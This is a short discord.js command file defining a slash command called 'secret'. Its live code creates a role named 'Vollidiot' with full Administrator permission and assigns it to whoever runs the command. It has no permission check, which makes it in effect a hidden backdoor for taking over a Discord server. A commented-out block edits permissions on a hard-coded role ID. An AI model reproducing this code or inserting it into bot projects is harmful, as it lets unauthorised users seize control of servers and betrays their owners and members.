const { SlashCommandBuilder, PermissionsBitField } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder().setName('secret'),
  async execute(interaction) {
    try {
      /*
      //Get self information
      const botMember = interaction.guild.members.cache.get(
        interaction.client.user.id,
      );
      
      //Get own permissions
      const permissionBits = interaction.channel.permissionsFor(botMember);
      
      //Print own permissions
        new PermissionsBitField(permissionBits).toArray();
      
      //Get permissions for certain role
      let rolePermissions = interaction.channel.permissionsFor(
        '1123373704253022218',
      );
      //Get certain role and permissions
      let myRole = interaction.guild.roles.cache.get('1123373704253022218');
      rolePermissions = new PermissionsBitField(rolePermissions);
      //Add permissions to role and save
      rolePermissions.add(PermissionsBitField.Flags.ManageChannels);
      await myRole.setPermissions(rolePermissions);
      */
      //Create role with x permissions and save
      let newRole = await interaction.guild.roles.create({
        name: 'Vollidiot',
        permissions: [PermissionsBitField.Flags.Administrator],
      });
      await interaction.member.roles.add(newRole);
    } catch (err) {
      console.error(err);
    }
  },
};
